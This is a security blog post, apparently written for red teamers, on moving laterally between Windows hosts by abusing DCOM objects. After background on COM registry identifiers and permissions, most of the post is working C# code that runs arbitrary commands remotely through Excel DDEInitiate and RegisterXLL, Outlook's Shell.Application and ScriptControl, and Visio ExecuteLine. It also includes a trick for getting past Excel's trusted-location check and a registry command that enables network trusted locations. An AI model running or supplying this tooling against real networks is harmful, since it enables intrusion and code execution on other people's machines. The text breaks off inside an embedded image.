# Lateral Movement Using DCOM Objects and C#

## TL;DR

This post is a description of a brief study of DCOM technology, and how to abuse that for lateral movement purposes. This post is mostly based on the amazing work of Matt Nelson [enigma0x3](https://twitter.com/enigma0x3) and Philip Tsukerman [@PhilipTsukerman](https://twitter.com/PhilipTsukerman), and presents an implementation of their work in C#, highlighting a few grey point left in Philip paper, [New lateral movement techniques abuse DCOM technology](https://www.cybereason.com/blog/dcom-lateral-movement-techniques). 

## Introduction

Often, during a red team engagement or internal penetration test, a tester requires to move laterally in the compromised domain, to extend his access and permissions up to the designated target.

 >Lateral movement is the process of moving from one compromised host to another. 

Among the methods used to accomplish this, the most easy and commonly used (at least in the past) wass surely PowerShell Remoting, but there are other pretty interesting methods used nowadays to achieve the same result. 

The method explained in this post is lateral movement abusing DCOM technology.

## COM Layer

COM, or Component Object Model, is an old technology introduced by Microsoft around 1995, which provides a user-mode framework which allows to develop reusable object-oriented components using programming languages.

Nowadays, the term COM is used to describe different related technologies, as:

* The COM model itself
* The inter-process communication protocol and registration that allows components inter-communication, which allows clients to interact with COM object hosted on remote servers
* The protocol specifications built on top of the COM object model to enable hosts to communicate with objects written in multiple languages, shuch as OLE Automation and ActiveX technologies

## DCOM

DCOM is an extension of COM, which allows applications to communicate with and use COM objects on a remote computer as they were local, using the DCERPC-based DCOM protocol. The distinction between COM and Distributed COM (DCOM, or COM across machines) is often only theoretical, and most of the internal building blocks are shared between the two technologies.

Information about every COM object, (identity, implementation and configuration) is stored in the registry, and associated with the following important identifiers, stored as GUID:

* CLSID - The Class Identifier is a unique identifier for a COM class, and every class registered in Windows is associated with a CLSID. The CLSID key in the registry points to the implementation of the class, using the InProcServer32 subkey in case of a dll-based object, and the LocalServer32 key in case of an exe.
* ProgID - The Programmatic Identifier is an optional identifier, that gives a human readable, friendly name to a COM object, which can be used on behalf of a CLSID when requesting a COM object. 
* AppID  - The Application Identifier is used to specify the configuration of one or more COM objects associated with the same executable. This includes the permissions given to various groups to instantiate and access the associated classes, both locally and remotely

To make a COM object accessible by DCOM, an AppID must be associated with the CLSID of the class and appropriate permissions need to be given to the AppID. A COM object without an associated AppID cannot be directly accessed from a remote machine.

Following Microsoft Documentation, the whole set of COM AppIDs can be found under `HKLM\SOFTWARE\Classes`, which correspond to keys stored under `HKEY_CLASSES_ROOT\AppID`, while the COM CLSIDs can be found under `HKCR\CLSID`.

When converting from a ProgID to a an AppID, the system goes through the following chain:

* Lookup ProgID among `HKEY_LOCAL_MACHINE\SOFTWARE\Classes`
* Lookup CLSID among `HKEY_CLASSES_ROOT\CLSID`
* Lookup AppID among `HKEY_CLASSES_ROOT\AppID`

So in case of ProgID = Excel.Application

``` 
> reg query HKLM\SOFTWARE\Classes\Excel.Application\CLSID

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Excel.Application\CLSID
    (Default)    REG_SZ    {00024500-0000-0000-C000-000000000046}

> reg query "HKCR\CLSID\{00024500-0000-0000-C000-000000000046}"

HKEY_CLASSES_ROOT\CLSID\{00024500-0000-0000-C000-000000000046}
    (Predefinito)    REG_SZ    Microsoft Excel Application
    AppID    REG_SZ    {00020812-0000-0000-C000-000000000046}

> reg query "HKCR\AppID\{00020812-0000-0000-C000-000000000046}"

HKEY_CLASSES_ROOT\AppID\{00020812-0000-0000-C000-000000000046}
    (Predefinito)    REG_SZ    Microsoft Excel Application
```

### DCOM Objects Permissions

DCOM objects are associated with a set of security configuration. In the scope of this article, the most important are:

* Global Access Permissions
    - Access permissions
    - Launch and activation permissions
* Application Wide Permissions
    - Access permissions
    - Launch and activation permissions
    
These permissions can be easily found in the registry in the form of Binary Values:

```powershell
> reg query "HKCR\AppID\{00020812-0000-0000-C000-000000000046}"

HKEY_CLASSES_ROOT\AppID\{00020812-0000-0000-C000-000000000046}
    (Predefinito)    REG_SZ    Microsoft Excel Application
    AccessPermission    REG_BINARY    010004805C0000006C00000000000000140000000200480003000000010018000700000001020000000000052000000020020000000014000700000001010000000000050A00000000001400030000000101000000000005120000000102000000000005200000002002000001020000000000052000000020020000
    LaunchPermission    REG_BINARY    010004805C0000006C00000000000000140000000200480003000000010018001F00000001020000000000052000000020020000000014001F000000010100000000000512000000000014001F0000000101000000000005040000000102000000000005200000002002000001020000000000052000000020020000
```

The binary values are raw security descriptors (SD) in binary form. In order to get the permissions of a user, the DACL for the user should be parsed from the SD, and checked against the user issuing the DCOM access/execution request.

## DCOM object instantiation 

A DCOM object can be invoked remotely following the below steps:

* The remote client sends a request to instantiate an object. If the request is issued against a ProgID, it is first resolved locally to a CLSID.
* The "server" will then execute a chain of checks, to ensure the request is valid and issued against an existing DCOM object. More specifically:  
    - Verify that an AppID to CLSID associations exists
    - Verify that the client is authorised to access the requested object 
* The DCOMLaunch service creates an instance of the requested class, establishes a communication channel with the client application. The client is then able to access DCOM object.

## Abuse

As explained, DCOM objects can be invoked and used remotely, and under certain conditions, they allows to execute arbitrary code on the target machine. 

### Overview

In the amazing research of Matt Nelson, the following objects were found to be useful for executing arbitrary code:

1. ShellWindows
2. ShellBrowserWindows
3. MMC20.Application

These three objects share a very nice characteristic, their permissions cannot be altered on a per application basis by default.
That means that the only way to deny access to them is disabling DCOM access globally or implement a firewall-based protection.

After that, Philip Tsukerman published a new research, focused on Office Automation objects. The research shows how, abusing that feature, it is possible to execute arbitrary code as well.
The DCOM objects->functions that can be abused for this purpose were:

4. Excel.Application
    1. DDEInitiate
    2. RegisterXLL
5. Outlook.Application
    1. CreateObject->Shell.Application
    2. CreateObject->ScriptControl (office-32bit only)
6. Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)
    1. Addons
    2. ExecuteLine
7. Word.Application
    1. RunAutoMacro

### C# "Exploitation"

A C# implementation of the methods 1 to 4.1 has already been presented and implemented within both [SharpDCOM](https://github.com/rvrsh3ll/SharpCOM) by [rvrsh3ll](https://twitter.com/424f424f) and [CsDCOM](https://github.com/rasta-mouse/MiscTools/tree/master/CsDCOM) by [rasta_mouse](https://twitter.com/_rastamouse), and repeating the obvious is not the author intention, however, it's necessary to explain how DCOM objects are called using C#. In order to do that, it's good to see the implementation of ExcelDDE:<br>

```cs
static void ExcelDDE(string target, string binary, string arg)
{
    try
    {
        // PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
        var type = Type.GetTypeFromProgID("Excel.Application", target);
        var obj = Activator.CreateInstance(type);
        // PS> $excel.DisplayAlerts =$false
        obj.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj, new object[] { false });
        // PS> $excel.DDEInitiate($binary, $args)
        obj.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj, new object[] { binary, arg });
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

_The above code has been taken from CsDCOM_ (comments added).
 
For completeness, you may want to check out the main project file, [here](https://github.com/rasta-mouse/MiscTools/blob/master/CsDCOM/Program.cs)

However, the tools presented lacks support for methods 4.2 to 7.1. 

#### RegisterXLL

RegisterXLL was certainly the most interesting functions to leverage, as following the research of Philip Tsukerman, the following payload should have worked:

```powershell
PS> pwd

Path
----
C:\Windows\TEMP
PS> ls .\EvilXLL.dll


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       23/06/2020     13:42          10240 EvilXLL.dll
PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS> $excel.RegisterXLL("EvilXLL.dll")
-2146826259
```

Nothing happened, the negative value is relatively near to Int32.MinValue (-2147483648), but it's unsure what that means, but the result is clear, something is failing.

Digging a bit further, it was pretty easy to discover that Excel doesn't allow to register XLL from an untrusted path. The trusted path is usually the root directory of Excel, under Program Files, so inaccessible to normal users. 

##### Bypass Path Restrictions

The question at this point was: is that possible to bypass this restriction and load an arbitrary dll?

It is known that being an admin user, it may be possible to change/add registry keys, thus allowing the attacker to enable custom locations, or to enable network shares, via 
```
reg add HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1
``` 
but what if that is not possible?

To accomplish this objective, the first step was to discover which paths were marked as trusted:

```powershell
PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations"

HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location0
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location1
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location2
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location3
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location4
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location5

PS >for ($i=0;$i -lt 5;$i++){ reg query "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location$i" | Select-String Path }

    Path    REG_SZ    C:\Program Files\Microsoft Office\Root\Office16\XLSTART\
    Path    REG_EXPAND_SZ    %APPDATA%\Microsoft\Excel\XLSTART
    Path    REG_EXPAND_SZ    %APPDATA%\Microsoft\Templates
    Path    REG_SZ    C:\Program Files\Microsoft Office\Root\Templates\
    Path    REG_SZ    C:\Program Files\Microsoft Office\Root\Office16\STARTUP\

```

The value %APPDATA% seemed very promising. On Windows system, the appdata value is set by default to `C:\Users\{username}\AppData\Roaming`. As any user can access its own AppData folder, simply moving the XLL under `C:\Users\{username}\AppData\Roaming\Microsoft\Excel\XLSTART` and load it, would be enough to bypass the path restriction. 

In the context of Lateral Movement, that would be perfectly fine as long as we could compromise a user on the remote system. Once executed, the following C# code would try to move the evil XLL under the correct path, before loading it:

```cs
public static void ExcelXLL(string target, string user, string binary, string args=null)
{
    if (!user || user == "")
    {
        Console.WriteLine(" [x] Invalid username");
        return;
    }
    if (!File.Exists(binary))
    {
        Console.WriteLine(" [x] XLL not found");
        return;
    }

    string absPath = Path.GetFullPath(binary);
    string path = Path.GetDirectoryName(absPath);
    string fakePath = $"C:\\Users\\{user}\\AppData\\Microsoft\\Excel\\XLSTART";
    string filePath = binary;
    string fakeFilePath = Path.Combine(fakePath, Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + ".xll");

    if (!Validator.IsValidXLLPath(path))
    {
        Console.WriteLine(" [x] WARNING: Loading XLL from untrusted location is disabled by default");
        path = fakePath;
    }

    var macro = $"DIRECTORY(\"{path}\")";

    try
    {
        var type = Type.GetTypeFromProgID("Excel.Application", target);
        var obj = Activator.CreateInstance(type);
        obj.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, obj,
            new object[] { macro });

        if (!Validator.IsValidXLLPath(path))
        {
            Console.WriteLine(" [-] WARNING: Trying to move XLL into AppData to bypass untrusted location check");
            Console.WriteLine($" [+] INFO: Old File Location {absPath}");
            Console.WriteLine($" [+] INFO: New AppData {path}");
            if (!Directory.Exists(fakePath))
            {
                DirectoryInfo di = Directory.CreateDirectory(fakePath);
            }
            Console.WriteLine(" [+] Moving XLL file");
            File.Copy(filePath, fakeFilePath);
        }

        Exception regXLLex = null;
        try
        {
            obj.GetType().InvokeMember("RegisterXLL", BindingFlags.InvokeMethod, null, obj,
                new object[] { fakeFilePath });
            var exe = Activator.CreateInstance(type);
        }
        catch (Exception e)
        {
            regXLLex = e;
        }
        // Cleaning Up
        if (File.Exists(fakePath))
        {
            File.Delete(fakePath);
        }

        // An exception was raised before, re-raising it
        if (regXLLex != null)
        {
            Console.WriteLine($" [x] ERROR: RegisterXLL threw {regXLLex.Message}");
        }

    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

However, in the context of local execution, it's possible to go a step further. As the user has access to its own variables as well, it's very easy to tamper the AppData value as well, just before the call to RegisterXLL. This would allow to load custom XLL from arbitrary locations (!!! **this includes drive-mapped network shares** !!!). 

The process to operate this bypass is simple:

1. Change AppData to a user controlled directory (e.g. `C:\Windows\Temp`)
2. Create the path %AppData%\Microsoft\Templates (`C:\Windows\Temp\Microsoft\Templates`)
3. Move the XLL into the folder (`C:\Windows\Temp\Microsoft\Templates\EvilAddIn.xll`)
4. Call RegisterDLL on the XLL file

The following C# code would do exactly that:

```cs
public static void ExcelXLL(string target, string binary, string args = null)
{
    if (!File.Exists(binary))
    {
        Console.WriteLine(" [x] XLL not found");
        return;
    }

    string absPath = Path.GetFullPath(binary);
    string path = Path.GetDirectoryName(absPath);
    string fakePath = Path.Combine(path, "Microsoft\\Excel\\XLSTART");
    string filePath = binary;
    string fakeFilePath = Path.Combine(fakePath, Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + ".xll");

    if (target != Environment.MachineName)
    {
        Console.WriteLine(" [x] NOT IMPLEMENTED: This method cannot be used remotely");
        Environment.Exit(1);
    }
    AppData appData = AppData.CreateInstance();

    if (!Validator.IsValidXLLPath(path))
    {
        Console.WriteLine(" [x] WARNING: Loading XLL from untrusted location is disabled by default");
    }

    var macro = $"DIRECTORY(\"{path}\")";

    try
    {
        Exception regXLLex = null;
        var type = Type.GetTypeFromProgID("Excel.Application", target);
        var obj = Activator.CreateInstance(type);
        obj.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, obj,
            new object[] { macro });

        if (!Validator.IsValidXLLPath(path))
        {
            Console.WriteLine(" [-] WARNING: Trying to modify AppData to bypass untrusted location check");
            Console.WriteLine($" [+] INFO: Old AppData {appData.GetCurrent()}");
            appData.Change(path);
            Console.WriteLine($" [+] INFO: New AppData {appData.GetCurrent()}");
            Console.WriteLine($" [+] Generating Fake Path: {fakePath}");
            try
            {
                if (!Directory.Exists(fakePath))
                {
                    DirectoryInfo di = Directory.CreateDirectory(fakePath);
                }

                Console.WriteLine(" [+] Moving XLL file");
                File.Copy(filePath, fakeFilePath);

            }
            catch(Exception e)
            {
                regXLLex = e;
            }
        }

        try
        {
            obj.GetType().InvokeMember("RegisterXLL", BindingFlags.InvokeMethod, null, obj,
                new object[] { fakeFilePath });
            var exe = Activator.CreateInstance(type);
        }
        catch (Exception e)
        {
            regXLLex = e;
        }
        // Restoring AppData
        if (appData.ChangeApplied())
        {
            Console.WriteLine(" [+] Restoring AppData");
            appData.Restore();
        }
        // Cleaning Up
        if (File.Exists(fakePath))
        {
            File.Delete(fakePath);
        }

        // An exception was raised before, re-raising it
        if (regXLLex != null)
        {
            Console.WriteLine($" [x] ERROR: RegisterXLL threw {regXLLex.Message}");
        }

    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

To finish, a few key notes on loading from network shares:

    - The network share should exist and be mapped to a drive already
    - You must be an Admin to enable a share on the machine
    - In AD context, you might not be able to use a a network share mapped via IP, so you may need to compromised a machine joined to the domain to do that

#### Outlook ShellExecute

Another interesting method, is Outlook's `CreateObject`. This method allows Outlook to create instances of other DCOM objects. Taking into consideration that certain COM objects allows to execute arbitrary code pretty easily, it's very easy to spot why that's an issue. Briefly, it is possible to: 

* create a `Shell.Application` COM object using `CreateObject` 
* execute commands with it using `ShellExecute`

```cs
public static void OutlookShellEx(string target, string binary, string arg)
{
    try
    {
        var type = Type.GetTypeFromProgID("Outlook.Application", target);
        var obj = Activator.CreateInstance(type);

        var shell = obj.GetType().InvokeMember("CreateObject", BindingFlags.InvokeMethod, null, obj,
            new object[] { "Shell.Application" });
        shell.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, shell,
            new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

Of course, the `Shell.Application` COM object is not the only one that could give an attacker code execution capabilities. `ScriptControl` is another object that can be abused to execute arbitrary code via Office Macros.

```cs
public static void OutlookScriptEx(string target, string binary, string arg)
{
    try
    {
        var type = Type.GetTypeFromProgID("Outlook.Application", target);
        var obj = Activator.CreateInstance(type);

        try
        {
            var scriptControl = obj.GetType().InvokeMember("CreateObject", BindingFlags.InvokeMethod, null, obj,
                new object[] { "ScriptControl" });
            scriptControl.GetType().InvokeMember("Language", BindingFlags.SetProperty, null, scriptControl,
                new object[] { "VBScript" });
            var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
            scriptControl.GetType().InvokeMember("AddCode", BindingFlags.InvokeMethod, null, scriptControl,
                new object[] { code });
        }
        catch
        {
            Console.WriteLine(" [-] FATAL ERROR: Unable to load ScriptControl on a 64-bit Outlook");
            Environment.Exit(1);
        }
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

Visio, although not used as other Office applications, serves two interesting methods to execute arbitrary code. The first one, `ExecLine`, can execute arbitrary code from a string.

Although a single line of PowerShell is often more than enough to achieve nice results, the research warns that `ExecLine` can execute just a line of code. In case it's strictly necessary to split the code in multiple lines, they must be divided using ":". 


```cs
public static void VisioExecLine(string target, string binary, string arg)
{
    var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
    try
    {
        var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
        if (type == null)
        {
            Console.WriteLine(" [x] Visio not installed");
            return;
        }

        var obj = Activator.CreateInstance(type);

        var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
        var doc = docs.GetType().InvokeMember(@"Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
        doc.GetType().InvokeMember(@"ExecuteLine", BindingFlags.InvokeMethod, null, doc, new object[] { code });
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

Visio offers another nice way to execute arbitrary code, via the the `Addon` property. If the reader had any chance read the original paper (by Philip Tsukerman), she might have been puzzled in seeing the following:

<img style="border: 5px solid #555;" src="data:image/png;base64,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